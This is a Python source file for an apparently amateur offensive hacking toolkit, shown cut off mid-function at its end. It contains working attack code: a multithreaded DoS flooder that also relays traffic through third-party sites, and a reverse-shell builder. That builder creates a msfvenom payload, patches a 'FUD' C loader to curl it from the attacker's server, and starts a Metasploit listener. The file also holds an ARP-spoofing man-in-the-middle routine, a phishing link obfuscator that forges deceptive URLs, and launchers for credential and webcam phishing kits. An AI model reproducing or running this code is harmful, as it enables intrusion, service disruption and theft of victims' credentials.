# CODED BY L0PA :)

import getpass
import ipaddress
import json
import logging
import os
import random
import tempfile
import re
import socket
import subprocess
import shutil
import sys
import threading
import time
import urllib.request
from queue import Queue

import colorama
import dns.resolver
import requests
import whois
import shutil
from colorama import Fore, Style
from requests.structures import CaseInsensitiveDict
from scapy.all import sniff, ARP, send, DNSQR, IP, getmacbyip, Ether, sendp, conf

import pyshorteners
from urllib.parse import urlparse


############################################## SETTINGS FUNCTIONS ##################################################

username = getpass.getuser()
colorama.init()



def check_distro():
    try:
        with open("/etc/os-release") as f:
            distro = f.read().lower()
            if "debian" in distro or "ubuntu" in distro:
                return "debian_based"
            elif "fedora" in distro or "rhel" in distro or "centos" in distro:
                return "fedora_based"
            elif "arch" in distro or "manjaro" in distro:
                return "arch_based"
            else:
                return "other_os"
    except FileNotFoundError:
        return "unknown"



def is_command_available(cmd):
    return shutil.which(cmd) is not None


def close_program():
    text_animation(f"\n{Fore.RED} [💀] Closing The Program...{Style.RESET_ALL}\n", 0.02)
    sys.exit()


def is_command_available(cmd):
    result = subprocess.run(['which', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return result.returncode == 0


def command_exist(cmd):
    return shutil.which(cmd) is not None
    

title = f"""{Fore.CYAN}
 ██╗      ██████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
 ██║     ██╔═████╗██╔══██╗██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
 ██║     ██║██╔██║██████╔╝███████║       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
 ██║     ████╔╝██║██╔═══╝ ╚════██║       ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
 ███████╗╚██████╔╝██║          ██║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
 ╚══════╝ ╚═════╝ ╚═╝          ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
                                                                                                                                                                 
{Style.RESET_ALL}"""

def text_animation(text, ms):
    for word in text:
        print(word, end='', flush=True)
        time.sleep(ms)


def menu_intro(section_name):
    clear()
    text_animation(title,0.0005)
    text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
    text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n\n{Style.RESET_ALL}", 0.0005)
    print(f"\n{Fore.LIGHTCYAN_EX} --- {section_name} ---{Style.RESET_ALL}\n")


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    
def windows():
    clear()
    text_animation(title, 0.0005)
    text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
    text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n{Style.RESET_ALL}", 0.0005)
    
    menu = f"""
        {Fore.GREEN}{Style.BRIGHT}┌{'─'*50}┐
            │{Fore.MAGENTA}{Style.BRIGHT}          L0p4 TOOLKIT - MAIN MENU           {Fore.GREEN}     │
            ├{'─'*50}┤
            │ {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Network Scanner                        {Fore.GREEN}      │
            │ {Fore.CYAN}[{Fore.WHITE}2{Fore.CYAN}] {Fore.LIGHTGREEN_EX}DoS Attack                              {Fore.GREEN}     │
            │ {Fore.CYAN}[{Fore.WHITE}3{Fore.CYAN}] {Fore.LIGHTGREEN_EX}IP Geolocation                         {Fore.GREEN}      │
            │ {Fore.CYAN}[{Fore.WHITE}4{Fore.CYAN}] {Fore.LIGHTGREEN_EX}CCTV Cam's                              {Fore.GREEN}     │
            ├{'─'*50}┤
            │ {Fore.CYAN}[{Fore.RED}0{Fore.CYAN}] {Fore.LIGHTRED_EX}Exit                                      {Fore.GREEN}   │
            │ {Fore.CYAN}[{Fore.YELLOW}99{Fore.CYAN}] {Fore.YELLOW}Update L0p4 Toolkit                        {Fore.GREEN} │
            └{'─'*50}┘
    """
    print(menu)
    s = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")
    
    
    match s:
        case "1":
            network()
        case "2":
            dos()
        case "3":
            ip_geo()
        case "4":
            CCTV()
        case "0":
            sys.exit()
        case "99":
            update_lopa_toolkit()


def ask_next_action(current_tool_func, back_to_menu_func, prev_func):
    try:
        print(f"\n{Fore.YELLOW} [1] Repeat\n [2] {prev_func}\n [3] Main Menu{Style.RESET_ALL}")
        choice = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")
        if choice == "1":
            current_tool_func()
        elif choice == "2":
            clear()
            text_animation(title, 0.0005)
            back_to_menu_func()
        elif choice == "3":
            main()
        else:
            print(f"{Fore.RED}Invalid input. Returning to main menu.{Style.RESET_ALL}")
            main()
    except KeyboardInterrupt:
        close_program()

##################################################################################################################


################################# WEB HACKING ####################################################################

def whois_lookup():
    try:
        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
        try:
            w = whois.whois(domain)
            print(f"{Fore.GREEN}{w}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}WHOIS error: {e}{Style.RESET_ALL}")
        ask_next_action(whois_lookup, web_hacking, "Web Hacking")

    except KeyboardInterrupt:
        close_program()



def dns_lookup():
    try:
        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
        try:
            result = dns.resolver.resolve(domain, 'A')
            for ip in result:
                print(f"{Fore.GREEN}[+] IP: {ip}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}DNS error: {e}{Style.RESET_ALL}")
        ask_next_action(dns_lookup, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()



def load_wordlist(file_path):
    """Load keywords from the wordlist file."""
    try:
        with open(file_path, 'r') as file:
            wordlist = [line.strip() for line in file if line.strip()]
        if wordlist:
            print(f"{Fore.GREEN}[+] Loaded {len(wordlist)} subdomain keywords from {file_path}{Style.RESET_ALL}")
            return wordlist
        else:
            print(f"{Fore.RED}[-] The wordlist file is empty.{Style.RESET_ALL}")
            return []
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Wordlist file not found: {file_path}{Style.RESET_ALL}")
        return []



def subdomain_scanner():
    try:
        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
        wordlist = load_wordlist(".files/big.txt")

        if not wordlist:
            print(f"{Fore.RED}Aborting scan: no subdomains loaded.{Style.RESET_ALL}")
            ask_next_action(subdomain_scanner, web_hacking, "Web Hacking")
            return

        print(f"\n{Fore.YELLOW}[*] Scanning subdomains...{Style.RESET_ALL}")
        for sub in wordlist:
            url = f"{sub}.{domain}"
            try:
                socket.gethostbyname(url)
                print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
            except socket.gaierror:
                continue
        ask_next_action(subdomain_scanner, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()



def port_scanner():
    try:
        target = input(f"{Fore.YELLOW} Target IP or domain: {Style.RESET_ALL}")
        ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 8080]
        print(f"{Fore.YELLOW} [*] Scanning ports...{Style.RESET_ALL}\n")
        for port in ports:
            s = socket.socket()
            s.settimeout(1)
            try:
                s.connect((target, port))
                print(f"{Fore.GREEN} [+] Port {port} is OPEN{Style.RESET_ALL}")
            except:
                pass
            s.close()
        ask_next_action(port_scanner, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()



def run_wpscan():
    try:
        clear()
        text_animation(title, 0.0005)

        text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n\n{Style.RESET_ALL}", 0.0005)
        print(f"{Fore.LIGHTCYAN_EX} --- WPScan Tool ---{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] Enumerate Usernames")
        print(f"{Fore.CYAN}[{Fore.WHITE}2{Fore.CYAN}] Enumerate Plugins")
        print(f"{Fore.CYAN}[{Fore.WHITE}3{Fore.CYAN}] Enumerate Themes")
        print(f"{Fore.CYAN}[{Fore.WHITE}4{Fore.CYAN}] Full Vulnerability Scan")
        print(f"\n{Fore.RED}[0] Return to Web Hacking\n{Style.RESET_ALL}")

        choice = input(f"{Fore.GREEN}root@{username}/wpscan:~$ {Style.RESET_ALL}")

        if choice == "0":
            web_hacking()

        target = input(f"{Fore.YELLOW}Enter the WordPress site URL (e.g., https://target.com): {Style.RESET_ALL}")

        if choice == "1":
            os.system(f"wpscan --url {target} --enumerate u --random-user-agent")
        elif choice == "2":
            os.system(f"wpscan --url {target} --enumerate p --random-user-agent")
        elif choice == "3":
            os.system(f"wpscan --url {target} --enumerate t --random-user-agent")
        elif choice == "4":
            print(f"{Fore.YELLOW}[*] Launching full scan...{Style.RESET_ALL}")
            os.system(f'wpscan --url {target} --enumerate "u,vp,vt" --random-user-agent')
        else:
            print(f"{Fore.RED}[!] Invalid selection.{Style.RESET_ALL}")

        ask_next_action(run_wpscan, web_hacking, "Web Hacking")
        print("\n")

    except KeyboardInterrupt:
        close_program()
        return


def check_wpscan():
    try:
        if command_exist("wpscan"):
            run_wpscan()
        else:
            text_animation(f"\n{Fore.CYAN}[+] Installing WPScan...{Style.RESET_ALL}\n", 0.02)
            if check_distro() == "debian_based":
                os.system("sudo apt install ruby-full build-essential libcurl4-openssl-dev libssl-dev zlib1g-dev -y && sudo gem install wpscan")
            elif check_distro() == "arch_based":
                os.system("sudo pacman -Syu ruby base-devel curl opensshl zlib --noconfirm && sudo gem install wpscan")
            elif check_distro() == "other_os":
                text_animation(f"\n{Fore.CYAN}[+] Error, WPScan not installed... {Style.RESET_ALL}\n", 0.02)
                web_hacking()
            else:
                text_animation(f"\n{Fore.CYAN}[+] WPScan Installed! {Style.RESET_ALL}\n", 0.02)
    except KeyboardInterrupt:
        close_program()



def web_hacking():
    try:
        menu_intro("Web Hacking")

        print(f"{Fore.CYAN}\n [{Fore.WHITE}1{Fore.CYAN}] SQLMap\n [{Fore.WHITE}2{Fore.CYAN}] xsstrike\n [{Fore.WHITE}3{Fore.CYAN}] WPScan\n [{Fore.WHITE}4{Fore.CYAN}] WHOIS Lookup\n [{Fore.WHITE}5{Fore.CYAN}] DNS Lookup\n [{Fore.WHITE}6{Fore.CYAN}] Subdomain Scanner\n [{Fore.WHITE}7{Fore.CYAN}] Port Scanner\n\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}\n")
        s = input(f"{Fore.GREEN} root@{username}/WebHacking:~$ {Style.RESET_ALL}")


        if s == "1":
            url = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
            run_sqlmap(url)
        elif s == "2":
            url = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
            run_xsstrike(url)
        elif s == "3":
            check_wpscan()
        elif s == "4":
            whois_lookup()
        elif s == "5":
            dns_lookup()
        elif s == "6":
            subdomain_scanner()
        elif s == "7":
            port_scanner()
        elif s == "0":
            main()
        else:
            web_hacking()

    except KeyboardInterrupt:
        close_program()
            


def run_sqlmap(url):
    try:
        command = f"sqlmap -u {url} --batch --level=5 --risk=3"
        subprocess.run(command, shell=True)
        ask_next_action(run_sqlmap, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()


def run_xsstrike(url):
    try:
        command = f"python3 .files/.web/XSStrike/xsstrike.py -u {url} --crawl"
        subprocess.run(command, shell=True)
        ask_next_action(run_xsstrike, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()

##############################################################################################################################


############################################## REMOTE ACCESS #################################################################


def remote_access():
    menu_intro("Remote Access")

    print(f" {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] FUD Reverse Shell")

    print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")

    s = input(f"\n{Fore.GREEN} root@{username}/RemoteAccess:~$ {Style.RESET_ALL}")

    match s:
        case "1":
            revshell(".files/.payload/main.c")
        case "0":
            main()
    

def update_c_file(c_file_path, ip, port, output_path):
    import re
    with open(c_file_path, "r") as file:
        content = file.read()

    new_command = f'char *command = "curl http://{ip}:{port}/code.bin";'
    content = re.sub(r'char \*command = "curl http://.*";', new_command, content)

    with open(output_path, "w") as file:
        file.write(content)


def revshell(template_c_path):
    menu_intro("Reverse Shell")

    if not is_command_available("msfvenom"):
        temp_dir = "/tmp/msf_install"
        os.makedirs(temp_dir, exist_ok=True)
        current_dir = os.getcwd()
        os.chdir(temp_dir)

        text_animation(f"{Fore.YELLOW}[-] msfvenom not found, starting Metasploit installation...{Style.RESET_ALL}\n", 0.05)
        if check_distro() == "debian_based":
            subprocess.run(
            ["sudo", "apt", "install", "gpgv2", "autoconf", "bison", "build-essential", "postgresql",
             "libaprutil1", "libgmp3-dev", "libpcap-dev", "openssl", "libpq-dev", "libreadline6-dev",
             "libsqlite3-dev", "libssl-dev", "locate", "libsvn1", "libtool", "libxml2", "libxml2-dev",
             "libxslt-dev", "wget", "libyaml-dev", "ncurses-dev", "postgresql-contrib", "xsel",
             "zlib1g", "zlib1g-dev", "curl", "-y"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            subprocess.run(
                ["sudo", "curl", "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb",
                 "-o", "msfinstall"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            subprocess.run(
                ["sudo", "chmod", "755", "msfinstall"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            subprocess.run(
                ["./msfinstall"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            text_animation(f"{Fore.GREEN}[+] Metasploit Framework successfully installed!{Style.RESET_ALL}", 0.05)
            os.chdir(current_dir)
        elif check_distro() == "arch_based":
            subprocess.run(
                ["sudo", "pacman", "-Sy", "--noconfirm", "base-devel", "postgresql", "libgmp", "libpcap", "openssl",
                 "libpq", "readline", "sqlite", "curl", "wget", "ncurses", "zlib", "git"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            subprocess.run(
                ["yay", "-S", "--noconfirm", "metasploit"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        else:
            current_dir = os.getcwd()

    payload_dir = os.path.join(current_dir, "payloads")
    os.makedirs(payload_dir, exist_ok=True)

    ip = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter your local IP (LHOST) > {Style.RESET_ALL}")
    port = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter port (LPORT) > {Style.RESET_ALL}")

    payload_path = os.path.join(payload_dir, "payload.bin")
    text_animation(f"\n{Fore.CYAN}[-] Generating payload with msfvenom...{Style.RESET_ALL}", 0.04)
    subprocess.run(
        ["msfvenom", "-p", "windows/x64/shell_reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "raw", "-o", payload_path],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    text_animation(f"\n{Fore.GREEN}[+] Payload generated and saved at: {payload_path}{Style.RESET_ALL}", 0.05)

    server_port = input(f"\n\n{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter port to start Python HTTP server > {Style.RESET_ALL}")
    server_cmd = f"cd {payload_dir} && python3 -m http.server {server_port}"
    os.system(f'gnome-terminal -- bash -c "{server_cmd}; exec bash"')
    text_animation(f"\n{Fore.YELLOW}[i] Python HTTP server started in new terminal at port {server_port}{Style.RESET_ALL}\n", 0.05)

    modified_c_path = os.path.join(payload_dir, "FUD.c")
    update_c_file(template_c_path, ip, server_port, modified_c_path)
    text_animation(f"\n{Fore.GREEN}[+] Modified C payload saved at: {modified_c_path}{Style.RESET_ALL}\n", 0.05)

    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".rc") as rc_file:
        rc_file.write(
            f"use exploit/multi/handler\n"
            f"set payload windows/x64/shell_reverse_tcp\n"
            f"set LHOST {ip}\n"
            f"set LPORT {port}\n"
            f"exploit -j -z\n"
        )
        rc_path = rc_file.name

    os.system(f'gnome-terminal -- bash -c "msfconsole -r {rc_path}; exec bash"')
    text_animation(f"\n{Fore.YELLOW}[i] Metasploit listener started in new terminal{Style.RESET_ALL}\n", 0.05)


###############################################################################################################################


R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow



def show_loading_screen():
    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    for _ in range(10):  
        for frame in frames:
            sys.stdout.write(f"\r{C}Processing... {frame}{W}")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\r\033[K") 


def link_mask():
    menu_intro("L0p4's Phishing Link Obfuscator")
    
    s = pyshorteners.Shortener()

    shorteners = [
        s.tinyurl,
        s.dagd,
        s.clckru,
        s.osdb,
    ]

    def mask_url(domain, keyword, url):
        parsed_url = urlparse(url)
        return f"{parsed_url.scheme}://{domain}-{keyword}@{parsed_url.netloc}{parsed_url.path}"

    try:
        while True:
            web_url = input(f"{G}Enter the original link {W}(ex: https://www.google.com): {W}")
            if re.match(r'^(https?://)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d{1,5})?(/.*)?$', web_url):
                break
            print("Invalid URL format. Please provide a valid web URL.")

        while True:
            custom_domain = input(f"\n{Y}Enter your custom domain {W}(ex: gmail.com): {W}")
            if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', custom_domain):
                break
            print("Invalid custom domain. Please provide a valid domain name.")

        while True:
            phish = input(f"\n{Y}Enter phishing keywords {W}(ex: account, login): {W}")
            if " " not in phish and len(phish) <= 15:
                break
            print("Phishing keywords should not contain spaces and must be under 15 characters.")

        show_loading_screen()
        short_urls = []
        for i, shortener in enumerate(shorteners):
            try:
                short_url = shortener.short(web_url)
                short_urls.append(short_url)
            except pyshorteners.exceptions.ShorteningErrorException as e:
                print(f"{R}Error shortening URL with Shortener {i + 1}: {W}{str(e)}")
                continue
            except Exception as e:
                print(f"{R}An unexpected error occurred with Shortener {i + 1}: {W}{str(e)}")
                continue

        print(f"\n{R}Original URL:{W}", web_url, "\n")
        print(f"{G}[~] {G}Masked URL {Y}(using multiple shorteners):{W}")
        for i, short_url in enumerate(short_urls):
            masked_url = mask_url(custom_domain, phish, short_url)
            print(f"{G}╰➤ {C}Shortener {W} {i + 1}: {masked_url}")

    except Exception as e:
        print(f"{R}An error occurred: {W}{str(e)}")
        
    ask_next_action(link_mask, main, "Phishing")

    

def phishing():
    try:
        menu_intro("Phishing")
        print(f" {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] Webcam & Location Phishing")
        print(f" [{Fore.WHITE}2{Fore.CYAN}] Credential Phishing")
        print(f" [{Fore.WHITE}3{Fore.CYAN}] Phishing Link Obfuscator")


        print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")


        s = input(f"\n{Fore.GREEN} root@{username}/phishing:~$ {Style.RESET_ALL}")

        if s == "1":
            os.system("bash .files/.phishing/L0p4-CamPhisher/L0p4-CamPhisher.sh")
        elif s == "2":
            os.system("python3 .files/.phishing/PyPhisher/pyphisher.py")
        elif s == "3":
            link_mask()
        elif s == "0":
            main()
        else: 
            pass


    except KeyboardInterrupt:
        close_program()



########################################### OSINT ##########################################################


def setup(tool):
    if is_command_available(tool) and tool in tools:
        tools[tool]()
    else:
        if not is_command_available("pipx"):
            if check_distro() == "debian_based":
                os.system("sudo apt install pipx")
            elif check_distro() == "arch_based":
                os.system("sudo pacman -S pipx")
            elif check_distro() == "fedora_based":
                os.system("sudo dnf install pipx")
        else:
            print("\n")
            os.system(f"pipx install {tools_install[tool]}")
            tools[tool]()


def sherlock():
    # Fatto
    menu_intro("Sherlock Osint Tool")
    s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
    print("\n")
    os.system(f"sherlock {s}")
    ask_next_action(sherlock, osint, "OSINT")


def maigret():
    # Fatto
    menu_intro("Maigret Osint Tool")
    s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
    os.system(f"maigret {s}")
    ask_next_action(maigret, osint, "OSINT")


def socialscan():
    # Fatto
    menu_intro("SocialScan Osint Tool")
    s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
    os.system(f"socialscan {s}")
    ask_next_action(socialscan, osint, "OSINT")


def holehe():
    menu_intro("Holehe Tool")
    email = input(f"{Fore.GREEN} Email > {Style.RESET_ALL}")
    os.system(f"holehe {email}")
    ask_next_action(holehe, osint, "OSINT")



def ghunt():
    config_path = os.path.expanduser("~/.config/ghunt/config.json")
    
    menu_intro("GHunt Tool")
    os.system("ghunt login")
    ask_next_action(ghunt, osint, "OSINT")


def toutatis():
    # Fatto
    menu_intro("Toutatis Tool")
    session_id = input(f"{Fore.GREEN} your session_id > {Style.RESET_ALL}")
    target = input(f"{Fore.GREEN} target username > {Style.RESET_ALL}")
    os.system(f"toutatis -s {session_id} -u {target}")
    ask_next_action(toutatis, osint, "OSINT")


def instaloader():
    # non fatto
    menu_intro("Instaloader Tool")
    username = input(f"{Fore.GREEN} Your Username > {Style.RESET_ALL}")
    os.system(f"instaloader --login={username}")
    ask_next_action(instaloader, osint, "OSINT")


tools = {
    "maigret": maigret,
    "sherlock": sherlock,
    "socialscan": socialscan,
    "holehe": holehe,
    #"ghunt": ghunt,
    "toutatis": toutatis,
    #"instaloader": instaloader
}

tools_install = {
    "sherlock": "sherlock-project",
    "maigret": "maigret",
    "socialscan": "socialscan",
    "holehe": "holehe",
    "ghunt": "GHunt",
    "toutatis": "toutatis",
    "instaloader": "instaloader"
}


# Still in development guys :')
def osint():
    try:
        menu_intro("OSINT")
        
        text_animation(f"{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
        time.sleep(3)
        main()

        s = input(f"{Fore.GREEN} root@{username}/OSINT:~$ {Style.RESET_ALL}")

        match s:
            case "0":
                return main()
            case "1":
                setup("sherlock")
            case "2":
                setup("maigret")
            case "5":
                setup("socialscan")
            case "6":
                setup("toutatis")
            case "8":
                setup("instaloader")
            case "11":
                setup("holehe")
            case "13":
                setup("ghunt")

        #if s not in ["1", "2", "5", "6", "8", "11", "13"]:
        #    text_animation(f"\n{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
        #    time.sleep(3)
        #    osint()
        
        text_animation(f"\n{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
        time.sleep(3)
        main()

    except KeyboardInterrupt:
        close_program()




################################# DOS ATTACK ##############################################

def dos():
    try:
        clear()

        text_animation(title, 0.0005)

        def load_user_agents():
            global uagent
            uagent = [
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
                "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
                "Mozilla/5.0 (Windows; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
                "Mozilla/5.0 (Windows; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                "Mozilla/5.0 (Windows; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
            ]

        def load_bots():
            global bots
            bots = [
                "http://validator.w3.org/check?uri=",
                "http://www.facebook.com/sharer/sharer.php?u="
            ]

        def bot_attack(url):
            try:
                while True:
                    req = urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
                    urllib.request.urlopen(req)
                    print("\033[94m [Bot] Sending indirect attack request...\033[0m")
                    time.sleep(0.1)
            except:
                time.sleep(0.1)

        def direct_attack(item):
            try:
                while True:
                    packet = str(f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(uagent)}\n{data}").encode('utf-8')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, int(port)))
                    if s.sendto(packet, (host, int(port))):
                        s.shutdown(socket.SHUT_WR)
                        print(f"\033[92m[{time.ctime()}] Packet sent successfully\033[0m \033[94m<-- HaxL0p4 packet -->\033[0m")
                    else:
                        print("\033[91m Connection closed unexpectedly\033[0m")
                    time.sleep(0.1)
            except socket.error:
                print("\033[91m [!] Connection error! Target may be down.\033[0m")
                time.sleep(0.1)

        def attack_thread():
            while True:
                item = q.get()
                direct_attack(item)
                q.task_done()

        def bot_thread():
            while True:
                item = w.get()
                bot_attack(random.choice(bots) + "http://" + host)
                w.task_done()

        def get_user_input():
            global host, port, threads

            host = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
            port = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter target port (default 80): {Style.RESET_ALL}") or "80"
            threads = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter number of threads (default 135): {Style.RESET_ALL}") or "135"


            print(f"\n\033[92mTarget: {host} | Port: {port} | Threads: {threads}\033[0m")
            text_animation("\033[94mPreparing attack...\033[0m\n", 0.03)

        # Queues for threading
        q = Queue()
        w = Queue()

        # Read headers
        with open(".files/headers.txt", "r") as headers:
            global data
            data = headers.read()

        get_user_input()
        load_user_agents()
        load_bots()

        # Test connection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.settimeout(1)
        except socket.error:
            print("\033[91m [!] Could not connect to the target. Check host/port.\033[0m")
            sys.exit()

        # Start threads
        for _ in range(int(threads)):
            t = threading.Thread(target=attack_thread)
            t.daemon = True
            t.start()
            t2 = threading.Thread(target=bot_thread)
            t2.daemon = True
            t2.start()

        # Task queue
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(0.1)
            item += 1
            q.put(item)
            w.put(item)

        q.join()
        w.join()

    except KeyboardInterrupt:
        close_program()

########################################## END DOS ATTACK ###################################################

def netcat_listener():
    try:
        clear()

        text_animation(title, 0.0005)
        port = input(f"\n{Fore.YELLOW}Port: {Style.RESET_ALL}")
        text_animation(f"\n{Fore.YELLOW}CTRL+C for return to menu...{Style.RESET_ALL}\n", 0.02)
        try:
            subprocess.run(["nc", "-lvp", port])
        except KeyboardInterrupt:
            text_animation(f"\n {Fore.RED}[!] Connection Closed... Return to main menu...{Style.RESET_ALL}", 0.02)
            time.sleep(1)
            main()
    except KeyboardInterrupt:
        close_program()


def network():
    try:
        menu_intro("Network")

        print(f" {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] Network Scanner")
        print(f" [{Fore.WHITE}2{Fore.CYAN}] Port Scanner")
        print(f" [{Fore.WHITE}3{Fore.CYAN}] Web Spy")
        print(f" [{Fore.WHITE}4{Fore.CYAN}] Netcat Listener")
        print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")

        choice = input(f"{Fore.GREEN} root@{username}/network:~$ {Style.RESET_ALL}")

        match (choice):
            case "1":
                net_scan()
            case "2":
                port_scanner()
            case "3":
                web_spoof()
            case "4":
                netcat_listener()
            case "0":
                main()
    except KeyboardInterrupt:
        close_program()


def net_scan():
    try:
        text_animation(f"\n{Fore.RED}[*] Scanning local network using ARP...{Style.RESET_ALL}", 0.02)
        print("\n")
        os.system("sudo arp-scan -l")
    except KeyboardInterrupt:
        close_program()

    
    ask_next_action(net_scan, network, "Network")   



def get_main_domain(domain):
    parts = domain.split(".")
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return domain

def enable_promiscuous(iface):
    os.system(f"sudo ip link set {iface} promisc on")

def arp_spoof(victim_ip, gateway_ip, iface):
    conf.iface = iface

    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not victim_mac or not gateway_mac:
        print(f"{Fore.RED}[!] Impossibile ottenere gli indirizzi MAC. Controlla la connessione di rete.{Style.RESET_ALL}")
        return

    pkt_to_victim = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
    pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)

    print(f"{Fore.CYAN}[*] Starting ARP spoofing (MITM)...{Style.RESET_ALL}")
    try:
        while True:
            sendp(pkt_to_victim, iface=iface, verbose=False)
            sendp(pkt_to_gateway, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] ARP spoofing stopped.{Style.RESET_ALL}")

def dns_sniffer(iface, target_ip=""):
    def process_packet(packet):
        if packet.haslayer(DNSQR) and packet.haslayer(IP):
